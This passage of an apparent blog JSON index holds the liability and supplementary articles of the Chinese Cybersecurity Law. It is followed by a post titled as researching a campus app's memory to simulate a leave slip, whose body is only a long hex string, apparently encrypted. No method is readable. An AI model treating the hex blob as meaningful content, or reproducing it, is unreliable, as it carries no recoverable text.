因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。\n第六章 法律责任第五十九条 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。\n关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。\n第六十条 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：\n（一）设置恶意程序的；\n（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；\n（三）擅自终止为其产品、服务提供安全维护的。\n第六十一条 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。\n第六十二条 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。\n第六十三条 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。\n单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。\n违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。\n第六十四条 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。\n违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。\n第六十五条 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。\n第六十六条 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。\n第六十七条 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。\n单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。\n第六十八条 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。\n电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。\n第六十九条 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：\n（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；\n（二）拒绝、阻碍有关部门依法实施的监督检查的；\n（三）拒不向公安机关、国家安全机关提供技术支持和协助的。\n第七十条 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。\n第七十一条 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。\n第七十二条 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。\n第七十三条 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。\n网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。\n第七十四条 违反本法规定，给他人造成损害的，依法承担民事责任。\n违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。\n第七十五条 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。\n第七章 附  则第七十六条 本法下列用语的含义：\n（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。\n（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。\n（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。\n（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。\n（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。\n第七十七条 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。\n第七十八条 军事网络的安全保护，由中央军事委员会另行规定。\n第七十九条 本法自2017年6月1日起施行。\n","categories":["法律","网络安全法"],"tags":["法律"]},{"title":"从应用内存上来研究智慧曲园模拟请假条","url":"/posts/6cb5ad08.html","content":"\n\n  898d36ea1c222b6e3e9bd3b7035c901f96cb50998c40976b85d1654b5069ad29a17bcb516f4da67728311d1fd51c22164dc4349ce46eb358d51c898772826c2d8410dd7b96a9fe5e214b40639ac0dff1876834d39a376a780d9c258d9d706fd6bb0706300c34235ebbe10e254018bd0f7f32bd3e25993f6ed5baeca5dbe05c7158d0d94eba5f0ca3bef9466cb7af30add39f72cddf0087e2d5fe6118bd0bf2e588ff22f6174d6a61820a04788327fb3e135649ce476f54aa9c4700d712052a43bec40df92a2c2cc0325e2dfc0cb25abf5a28ae1506f4fdf32555101b5f2e4c226de31e6508e3d695aec0eb161c08755a9e8ad4fab39fae6155ddc8c280f01263385d4f3f9d19c7e15d98d00127ad70b115aa1ee6c94c0999db5d656c1c7d377003717ed0ec58f3b68c469ee6abe0de0f434bd2c0906e7eeb5f2de4c1918496220091bdf234074174b8920ab4651ea46ebfd954f9b4a2248b2d1a245e7832718512f6e8452207712f373b4e552e4911f639b3782baf9ff17cdee1a6c80d991fbc44606b300dcd300e2ab349a7d35bcb81a81e7abf67b6d406f5eae4ca9dd1973615cdd982598e1928d7a753888a2e1be8325af548f5502768641bfc969fa4c58bf9c68270050d08a53698a4d83b3bc4418b747527a5b20a971bbdfb184a2a91e1c5825927b464b71c136fc9b0b7d246d3d39964f3109188f276710a149eca510a420b8686f64712e1e5aa0e331f7515ee83b8da1b2772e7e2ee397e0ada5fa458026384719617df11ed88580f895ef1cfee00febf03f551b1f2a3184acc040a85eb1b22e8143323c14ec9d34aeabd6a4dbbdaaad6d2cc3d1cec50f2f560b2728746f225e1e1c70527cac34e0bfb5db8975a077169dc7d38ccc38f77ab7700b0e93153b7d8a92d9cb270471f1c6c48d920e525a030f66ebae95a11328b1b586babc3d27309eb3cca28a4b7dd7ab2e126bde4beed9acca14bf11d8e67db3bc6fc05b9ad1236914269585ca723f2df95dbee0c08e374e4367dbc6e7b1644bc412c0d7ce13d9565c4fe00f2a075d9aedff6ea19bb5a248de3aa50b2551d4a3340d2e369acceb08b40be110682c5ae6c6d08151de98582cf0c09e8d0c18ad469fc31718fa2d8fda92a4cf65c35ab517467a4a9243b8ab8785d656130adc74e1a91dfc6b7dedde9fa5ca0199688792eafb4fab50d5825dd0902cb7a9cbe1ef5e0afd85e93ef540fbf6e521212e7a100781f7587f417c6a92c723f4ef877f254c02688d1ce1e16b568a5d3d8ad8ec6e5a8dfddbd04d17a2dd03e6fcd2188464ecf3252b64cf6dc72246c73544797acdf75707fa95727ead6f2bb3517bddac59691f875ee1b41074af1cc203d4de16ed17f8c802f23d18504a60766601a178fe114cb2f63c81db2b2e47038ef28f4fb3057d8841b8d3a0edd7ee212c8aae3494a9a4276ba4b3988fca0ff626dafaef4c347c2509dc2cec3839023c7e6c70725bae6ab6fa7c4e9a1b68942145cd02b22f109180fbe01276930cee580a764cccbbb275a804879fe5d876de7d4eaddb71552c5efbfd2a4da7017e9d6bf133db90bf3ce35926a64ef115cf5e4e094a065793484c4f3d88dafeaafd5c467308caf4cc71b66836fc966d1084b978beb8fa93fa1a1a2e6e779b05fc42e2aba697d939c59bfdad4a47b30fd9c95c18e81cf24d3790eb3b33712fb029c10a9a03dbe6d582261742c6b81efc5aeab0184dfd574411047ae521dfe69edf84cead82a0742ecc44292a78f2fe35aa7cdf866963b318237b94164af1f1fc5669a09045673f918f4eac00c66bffdf6ace51c5af544ca4e7c5a705990bb6d94f960e864b1ca925c68cf1caecc235a86614b124dc9ed04942f9ee5c50d949504e85367abb088297eebeb3e2e44747304af693142835e6f11cb6c09f39ef9b5eabdd26eb5f02d21b09a982247cc7e96fcb2283fbaad831faa661fd49b45264a574fe92f8fe7d324af97cadbc78c6dff40290e63e1a0ad653ff99d925004c838e7607b68fb151135f48a5d1d2a4fb1b45687d58e22a3e6fd5a4c533de18bb662be19bc28250f1bac57026e7d782d88f96e16639a82c29be7c9248265b396d26b854355ad8f6605b2f8ac6f091c6ed717293b01288b8d8b144e3c32ea4af30a72036c36728217629b40c4d20df09b4d1e24434fa6f32ee49329c66482d08ea8ef62242e4d89698fda2237f4886b27f9853a533655b3ad6feb426cef6f31ea3f499fc07425925c1b98433e4a56e56e7c7be50077cfe2c6e7681958f7d9aad69bfcde32be85fcca49710bb30ddfb741ae32ed1422b687b126d2d9deef6d28aaf1dc30849bd3a6246340729926fe81d6b135c97134592cdc22c20cc05e2c2e256cad74c0aafcaceb3521563de70282f10fdfe10b57f8beb12de07c0765cf1d1b0e84499b5efb7a09e69e8822719fe66cc4f7f1776f5a951bfca41cf700a3db6b8882bab4f04531af2566c22ca70eba9d6b53b2449e13f03ccbd98106ab230bf4c46e8b88981b73594db5191adefe26c09ce167bc67cd6b1d404741489e8033d74b4764b027cc212878b4c47eb85c69e8df4a392928fc4e75a95f17bc819ffcebb5c4ea124ca2547d5b61b356074d9643538fadc30633a20366742143238c697ef5bc640e21e57ed7296e92e34025081563d3eb142a45ece657baf2fb724d2beddc6151b990118d7b157a027a65fee2b2074f35faa9f350d6961575b99f5f90297615347b172b4913953c976b2634285308c087ea366d5d29a6d37cbbca7eafc35c6f99e38c9d7840bfcf54f2af226294a28df264735c26a2967d84db95b02fb1c87f26db95b6de99e0ae879b7b3e7293293ef1c66bbe28e523921bcdfcb1d3c8a20b55b1aa3b0c52b95d8d8a6b22f03b8ebfbe1e1bfb205b02a4ca65ab1c9fae5fcd44b5ecddec8097b6419634cabe8704716c56c9abd3122b4c912de560d057ffe8616a3f1e870a544879afe982c3d8595d367ae94ae2ce8b8038313e8c6e9740e9b1307d462a79da843e56e7acafea5d55a51cdb59ac38d8149507d512ee5486622ce661b40218a30e707d5b5ffa88d68330af052ca935e304fe2a9e585a093c4f328489053cc2b5e55db17609926fa6caef1d2040f711154f8a5af697a310fa98ca9bcaa5ac9475266f614615e296f093e91e091e0974f01a55c7ffce45dd4e8126b8971ae63023dea7c391f2bd08acae27c8a4091eb7e5c13f52b98b3ddb0f67aa29268a37fedb00d4c39fdbb79f64754e7432d8805d8461a17cabd27f6e280f1b9711a931d482b3a72be0860cfe03abf6626e9f4feebbb4872177a7041876db644748e6b811150a066cbd58ec7a7547a821fb5cb71f9972d575fab3d0cc692df55308a9d3fe05d17c9f64521cbe45f1db99a842a54ab8d75c1e84aa314a24c407a56c8eb1e743b5e91ab3c22fbbb47fb4d02e2b452f01825a846186a3d4ff1b0e5fb993baa95525d51f44eedbb53c7fcd567c1bd0ffe753c363e7e48d9d21bf3606796c38d26c46e1c334da838924273760aeba9f27c977302fb248f95d77f901211ab50bf5c9d2fe8edb352003bb21059f46b3fa38f21b3a634e8bf15f1814d547e89fa01c42ca7782a1e0821436eb9e647e9fd9ca4243b4cf612ae476bed851e4a2751e91b33d4977df98e6b3da878c72248840684319d7740fbf4951d8f727919a6453adaad3a4c428171160905f9556bec6b25d41d956a36eb648d9c86116a992246fd850a2c05f9bb117876f49481ffb709ece08131b46b309fd555f37747a21737bdb0cf9a429c4387e92d14e6b4902ee64c6361f222ac6df527e34dd02413d6a138626ee901bc285fcfce1c132f35da91da6b73906e1cb62e119653bfa378e0ddae7e45c9e762d86a13d3ed6122be6c408c083684ba8cc7cceba64fea49893e51458630e3e174e2ac9f897ad30650e70727e6fbf95b2526cb08091ea705b446126e7c1d70c0b7c8c1f8671d93d5f6091f646dde221586b67be68be65151b65a5c99223c437f9cd75e3dd790771e9c1e0f095c89c06f5843eb9cead64f9d32239a5d0b393800526dbb243132fe3676d11aeaf0c7c4182f9f083c1b41ef19004545bf313bdc34c73321d2300a0d802ebc7f9df51d845cded019e6905f9f13fa7d2a74f5bd5d3f90fa6fffb49e8c10c7bb5d2b4052f444815677f2b1e2e030abf4bbce1340dc441d593c9b571066fd58f964edefc27b59dfbd979bbb9d4a3d7fc6636c57744849c12cfaaccd26e36228fb364a869e3f4ed4d3b8af55af4e6841676d8985336d36c2e9eeda51b02c41fbb01f4f2043c26225e3b31bec2eaf1b91ee5df6f2d95e74a62e8c9c7c85c5c17aa7126ffaeff21f00d586a62c142458c2488b653e680b44e105f83dd2c2cdaa17234ee1c405aabd11d770a9ac2760c9fff58e4ae44e68f8421f7563297da83759b31eda4975ab0ccb4f8edfed008377593f244b18cded0dc3404634c2b4e5d9ee1b30e5dae7484ce2c99b5b4323ed1784a15edd6be0e4527b5a1bce5feb8b7d377d06500bad1ccead93158eee0a93785397d08d37e8e49fc2a1a36ff1417419606097cbd60425dd48ca1a1efdd5084cc38ca983bd0bc4b8527f61e4c1b5b7461231bb5e930b4b16a0058830b008f0f0f18fa34971a4facc9686801f6b2e24d9cb5c77dec372b20fabaa468a7b444cbee6f0198d95b2aded7cbfb10fe28a47bd066768011f59e698e95b1a336888a8875fe89590f31e19c2554499ab7c1ecc63acc1c27568935dcdb2f956e091ddf1b3079e7601223a16dad023498a539abd0f8f3322eada8b4ffa6ae6ef0167cc0830a2b5bae5cf1ac543338de12e1d06ae225372d5aaf5d209e94fb54558080e43e81c6bf4a47258727774e702f11188fb2694754eb55ff2cbc933d3c6c4a4fb78686b896aa8d4fdf1bbf62dda157c362ec08558a5f1f6dd4d2cdd6bfaf8ac8ebe7c30cced511dc1cdb1441bcc625ad9ed8a5713e8173f80d8a57801519f5117a252ce34842c766989670195fe62e9504be3f2486e9c49254a3e7d933fc8a2ff48e99d6d5faa12cc201047cf0126014d945bd75981a8dc6eb845817799c541cfc55be75cf19beb05ab7306e04344dbfe9a5edbb3322387f28da476f8d6d578eb0df3de51ca43d87a2ac25a4ff8313c40238a28eb628b968b68fce92da31aeaed2107d4e08fa4d0a07934a7f875ef70ffb7bf6915441ff9ac3ec1ece8698753e19d7c463206a8e330486428126fc9c9fa7039122b7589feaccc0408b539a6cdbce2d3948bad9be3b996e3af884eca9fc8d37f164e9b11504d121088cc95d59b6b31089f855499ebb97bd491a7c07eeb2654d88353809e35dc340d25bde2759797e29b40a34f95faafe1a6f498f4763e9c4f7d0f847ad7ac29564bb637c024287848caa20650f09f790b1e7bf71f43680252d6564a3cc8b70865bf81e5d8a95abc9a0497be8d08465a5eabf763d5ad9e0d12c5688e1d78000ebbf0e102b3dd2ac4c025457b219f2eaf3ad58c88ab3c179e5257dc4ab914a6f1ee52efbac98990d8e255c1b4a26fc47c117a72613d4c042f479db187b1831e8d37aa6bd0b67710e0ccce45730b1085220f6e2ee68064b4722bca09cd81e331e77ddde8f4a64557b92e74a77f6d2f5b6ce1b5972c4e05e7f2c6f88a62bfff168eb85bef99d10fb115896efe6f555083f80562f804eb5eb592ff5c135e29ae823b3480fae23b16bcfd6a9aa2d90a6f418b926bd040a0f02b5c4debdb9ec121225c62c5d8333bff4bb15eb9471618cc28cb6d827ee621ad2d1a9ad28a71960ffd80c04671f75b42c4ff2496ec54b0f1828385a21c936f6d86f332afbdf12ff1572e1e94e651f04913bee7671bedaafba363ec3da240bff1358efa91fdcfc5ad5b74cf2be1e10c1253c700f01ec7b514c9082828f731312bbc8ace5e5d570faecbf4346c6c7624da805f9b749ed91e569caa2016e0e77d2f0c3b08eafade6879714984ecd03b433801576d9e56aa02940c4b348de9af95e8c8c90b912cbc8e04ea1af6255cc35b29a5ca95ba3be12bbfff633dc90249da57b4d01c23ca4acbd129086f130f16460d19b1dea71c3bde0d8fb7fac50877676070ffdb91d3bb6f5b83befb4cff0f40923720559003bf8149c71c0da3a8a10ec9bf6574ffb4c6dc687bc1b4dd0185cdd7872b03bfaea1aa02b26b43fd5d1b37da312ee45ddae9377d4c0822aad3e423fa3d20a0ede86c08efd69281aae731194f257c8d4fae6938993bdbaa8ab9bff054d7c0395bf6c8052897ea2bf6e341aced2b6471ad1df22c911758911ab76736459879b11089a069302c12d17df6bf2ea9d08f017bad35fde87721bdfbff4e8b10c8ef786a197b2040c91ed1e96e95ad1ddddb9c91bf5635a4202f929d9216f55b07a61838dc97a121c30ca7330a40fc6ebfb175bf88aa0a67b51eb71342af6be974325be1fb9203cdee2fadb8c550cdf34e35b8e75708e37744e4868c7fcf89d4a5f87a4e086b3c1f8e2d495ceb7be8454146e372d41ee530d1ebd56f41c924c263e828e29c40c407b983594be46e3e6542a79161339974e1073b207da3b2f603a791e684a492ba11e5e2cbeab649824106a94e3e5f1cc95d617ba101add2bd624a767fb919c41e591a9ebfe451347fa1220d92d3ee24b5673a4303c3f14c74cfdec42b2fb4ab57fb6597dd32271fa977c8c5ddf34bdbc93432a01306eaed4ca7cf8f72a30aa0f9d10c0e8516fda7f4d41a056654ce8316ba2eeb34390ae48ec3d8deb986bff5b6869521294fb090feb5f334a28928a2026ee9c87660af88c82e69c197432bc243df50114bfd4709ae0388464ffaa7b45ff9942f6a4d1266fc1348295bef9f1f5afd988c6223012f622ed7c655d014d0c8ec605d359b79a052100a4d29242296f016d1c8ba23be2b327717ca392c33c69a3b074a9898348cbf992640405dcb29d280cc5705a813fab85df82ee8e7773d0e0e72c9ee32ae703d042c04490aef0543d414c4d4704d6cc2f676d072c01e15a35ba9a3c1ec4f1a97502bb177cda46f2744919cb5e1ef60ed775cb560b5185bbf9aa80db01d01cad27b93302068a04af7fade601875bce4e07044e236bc1013e557bee139fb96999026f498edfaeae10adfe2b650277ca27f18579f343e054c0202f865f127e4808a6a17a330023d0ce8a74e5543cab59f78e61f86c0c043c88e77795b2469d4252db1f83116f68328ce3dca064ec93e5ad6d46341518c80d47bbd1f22bb713d5b1789f2ec0e7cb803bba54b85065ea3d53854b1c9505508809935a15d15d70dca176c8d570d8a07b0c91e7237c6b1f90f4b9449f7fa46ec83f0db80a836ed739b3c244a60dbb783b61f7b17172f260f80e0fff7442a2e18d92ef31925e39f7633bc5db203532887aa54badbea2904614cd9939991c8c625867346dfeadaa88f0f6969841e8dccfc1c9ddd2aefc919b5ad59443e76f8acfc1185db71b2a1abc2338a4a7182c2a4cb7c25548f7210cad20beba119ce97eedd933c175b4c4fba0282e02162a12a97d4402eb1a577ff1c79f17819bf56ad6d937b2e81dcf3c508d377b50767ab78c72bdfa584cfbac41762bac7ac5b298ea8ec9c369535654a7af0c6ec4a5fa738f57848f01e73467f56724245424e1be5b65fc9e87ed9c3515316c8b4d1bace9968fcc3c7073f3ce1ec6e98ada3791041e82a48f97b1aa0a0538d2a59d789174f06663e6caa4d08fe21fc4607a82066522e62348686642560193c3ff1684d7aa9d13010bd1304c9d933cb29f1a31f00e4adfe1c746cb595c3fcef1081cc10683f34e8f4cf0a29cfb73877924973b488466a1d5cd25ea4e01a5c61015cef56d4b98002df0eb2f4e11f643bc1c8cc1bbceef7f276eef97476ea53e0f0e4ff8d878d2d6ef9d7451731ea1e59c334f2a3a74befd20c0cad0088120a42390972efbe4681f8d07de5b13a58b66ba5eab2577e1c23886c8e01b41f6086a15e3d827823cc83d23dca1a829fb113f60f5986ccf80656d48630b804c834188de062f623241cb057ffb2e17582e2ba286a1bfe066edebad9922fda8831dbf1888680fa8bb90ce9e39e4637f7abe5299ee10350f35368454bc1900f19e010614f612a411f6ec19a2d2461fbfe53b42b061506bb0de112606421f513afa9b8af633eb1e6092505b4c4fe11949bad0fe8a82ef20dc687300ece0769c7f97aaa4e9472fa7186a086b81cb05ea81abcc024094b652d1c361e7fe5a282aed0b9017bae04a3c51615461ff7bf7bc725cc78e89373c1f36bbee6c416110381fb069d9697da85217e6d1be5088193ac81f8d1a979ce1a46ff8f0456e4f577cbe3b7fe9de1b4aa69d51db36285114c8b9f6fbc76ac5862db45c641ba58ef873dce9655dd110e3cb2f3a5b3cb066afae3fc4b7de4cfde6ce0be3c0ab92ee8d87b830db1b5189137be6641d125143c4b7543043e0599656686058b72e8d4a22153e20c4d964f80745720fd4172491018fe23f92277f20a13671429d2fd7cdcfe73d614bb947424e79937731bee0689b62521e9a5eb71f98c379576337cc96bde219d0a842625078c066042e612165a02d259455d63a13e3d28618b91dfe4b7b71357e1110b971d26d6a6d576f5e8bcce67283643e5b60b3e6e73644c52785a26b8f0f96396dd684a8eff54dc893eef2d847c85fd8d6250b602a53007fcd40cc4d078ef4f0887e4cd56d348b545a9f7102bf0d3fb6af5ea32063f9448a1dd58724b4d2f628b9ae723473f51512d8509a3c3d061168ac54fb9d712074c1941df9cbe6b4d0a9bbcc2e07e051af78ef9166e14aff7f5e0e0031a4d509881d0e1614076143b964ad40beb271a3d1fdb7af9e5911f4670be6948f791e238ce8b4c61f719d72e23b383f39e01598a3ab612dbce01563bb5a7156c8ba9c23243302906d8176dc13cf4f373eba33820c326a9e7d296e86fb285daf2afed23e1b28b76cda4eb1be6b7537ef6b28bed0d379d3d3a4c9f16807359ad5fe10dce6b8334ae3cfffdd909da37437ca3f6c28d4a87ce76d246ad9590eec28fa401af936e76265b18c5330b5f16ca85f6b6f0269883efd408617839d252adbf59dcda062c1421da86b1cffe16b47b648779d1af308c2d946f3e0a0c45980178e736076629eb7132f9cbedce4a82ef295e385488c4725730c69826d8a9bbd73ff70b81b1df133b877549907d1e77ba6f2e76c35abdb2aa8606f2e5deef0e7c2dec231cc94a4452b16a2389648f07f6492914a6a6d83ce0d6f977bcef81e4906cc90f3b36c9e55684b87258aae2f3c4e1213985c67d52c95af70ea4e3043a1f737abb2f2e4b61093f65705a6de441619f23f6f1a923829fd863dd84cb94d4d16c2a5d2590819bf4437b05bacd7a03a775b8a4dfc1b9ef562ea0a6ca840e1eb0efc98aa5d7e08a173ce5d2e13ec3b68f9482fc99892ccbb097b994e115cc5a32a2b89a0731362c92b62b337dd2448f0b8fbbb660591cf7d40f6441a0b366b68f8ff11b9d458b8a05215f3de35d10ca5800f2feca5ad5387f3c1d297a2c4636df23090fcb73688d00f14ffef67e5abe73d7fe5f5345f049992c9153404a8a26bdb77d91e6b6936fefa72a5840b596d6b99521da8b3fb97f99765d5fb5f9693eb4904af4f60e54ca0d59c33fca2943f630d260f0ebba12f4cfdbb65b5fdccf438da59ebc557e5574da0d16e5398fa08d34686d1e7bbfeef631defb01c01a3b7489562aa9b26c6a6b87accbdad657e1fcef9009b887a7248bb68e242baea1b2c3fecc10f52e733918c5db6cadd6b02d837e7d24c3548bb236ad3b27dfcb9e0a0f65e20b7f1e5a626dfd2494dce17da5de771b7d6aa1dbe278b7dc3f1c1f16aa5a783010f35368633a58778fd0aec2afa42536c3fe50aadc7d5c2b23236a18f6b3ec707d85f83ea8242a7eee23f8f9e6791d68953ab7f8e65134f54e6282fd93c1d7194d25f5a4daabcbaea9680d585e7c7d17e251a227ebbdfaf3d276605a568b37f0775499f0856d58fbf6b6f99dd5b6e34deb34ffbf100e6fc845975dd03824829c9dd89d43dec85b03cae0ab40197dc822b0cf7a2af2c4595b597e35763dfb99a3f9fbbb20ec7b486f72d3ec7a2ab805979c43e61da8c1216e11114d7b1a42c4d34ae214de96d6f5fd7300b46d97b46223f1e1e5999e1ce3a4a5c7d819617d4179eb684cbfdf0ff1e71f63e41e36b7b769c4ece8025a211b87fd48216d546905e42a6b22456282d857c8af086378e0390bd2024430d97c70655ed25f9c2c22ca312f5a27d0358b73d131ce6efe9fc1d8857832a94dfd907a2f52170aaf87203f6e0bf36174876f2dd1c99ceeae0a49b20eca36f10386e795d49bdc1fbb31aab04407101fb35c8de08efa5071cb836d75d549ee81601b37b2882d6f549958691526b0a09f56400512b5f11f8e74828f1de5234a28a96c574102a1db43c4b600f55d96906f6c73029bf334c82de79f3b06ba33b3aa35ce079bf2e2c431a3a6ceb14d671d2a6b37455ea05c90d0db79ef5cfe002c8a3fe875e33333f0bca9d9f088bec15c2a65a012a58ccaeb85a876f94dfbf3be451881f8cd969399a42ca65951cf7b58198066f4fa7b33bf9383700468aed2c86e3a14d5fe361b10d801423514ce3e8b7c86f4638e5fd94c5766811ad515e0ad1b60e836597816839d9ebd517b0a881348603a09f42c54d953092cad5307e3fb39f07a376ffe8e9b1c0608426f0691fce91a8c5ede3d9fda7d716de356e44137337258c8f9534280556add946110ef57e2b7c611e0d1d2b79db1833c3b68e4650f15ca32fe20221ed2401c784d15df4c2242c761353328bd76a4227dfe65487011fc8514bf497a8ae879c591440e70a5e17c74c6fbdd5d7aada3e5d1c82e89e2d5df8830a79f728c2d288322fb78bc26d06518729cc104faabd7fbc733e2bd36b7a11d4c6e270b7052870a624ef40df720e5a1433803e217dac160b42b84954e1783b44e14f32910d7c67a3146c15019fef2bcc464bffe655b5716450adcebfc65b30ae6eaa5ab6b2adedd0daa63c4013475eaaf3b589f87d41b8cc31bc9c372676e157800d7f1ef4892ae13d2731a2d4f1fb1b21b6080e2efabcd93605938cd5292d3b7d846cd73e587e4a35fc1a5aba73ff60481a69b3e89ae102bdadbcea9d02ecaf9f2e4f52ec77eae8259c01028dfec890f73b007929523edf05ce7d2c89b6e8f98774f8c8e9a26a1fb3553fce4c3c75922bc48cc0986e4b81d4c02294492147a7893a0343306cae7b156af97b24f44dc1f65909b1a4706024259d1658cd747d763831dbcd6299d074fceba0a6266690da06a26f3b5243ed2b7a06dc043d45602c7402f2beaaee713f1fea08e772374225121066741961c7ae58974d5d5e7e5004627ae5fd97482196debf4f7c9e2dca5380869ea7e919f7a526dc65a70d5591b1f20b3b22c6cd2a1f8d6bfaa798240505aa38a4a9e1dbfb5846dfa418bb2d43c3da0878d1a8c46df81dc3df5576bf81f22099fc992571250628eb688e36e8d614df6a344d36e5d6b55381735f74e621864dc8e07388900cf58beac123b142a984319a7b2ab82e5a2691a2bd8d759baf8b8f9ef3dc2d70b3f6c928c1ca2fd0401135e9c6752f01158dc3735d04cb7b71851e35ce0dec19a96ef2e1956538377c0a14634d8ca7c9bb31c17c5eb7b3038d701fd1efff8949a9b3dde9106cd064a30c6c2eedc3c88597dd7bffcd893b1d461584bba715de904b195d3f7f0824db8fb4a6381cf4065a0c16bda18923c5df99cd569a5c4fa510c9f1970a70ad70214aa16cffc145cd0d58f4409fc2ebdb58deadcbe106469ce213b9f9295001b8bf71afa9e425e7c2113beff1ad3c45eeae2d8dac090ed95cb9b471aa1d7f2bda608fd8fbd8d49f9c159a55e1c63df660240f91098ed344311bfc0db0fae5bb84c0e05557d898cda9de31eac5b13f11b5441489a97d8d446f8ba5dc8076a3753ba3ec666046d5903c2a84aa291d40910f6132e4e9734158422e35fdcd26df3716980a128744d46f22743bf4cba938a55eb58c22d9d595802ca412c7dceb3294da1e09342a2d29bbbeccd37939f2a94a652f2ef5d450a0643221ff058f23b3d49ed2c4824c911e830df0e4e4f53662d36bf88feca60168d7d9255ce4ca0a25b8c6cfb25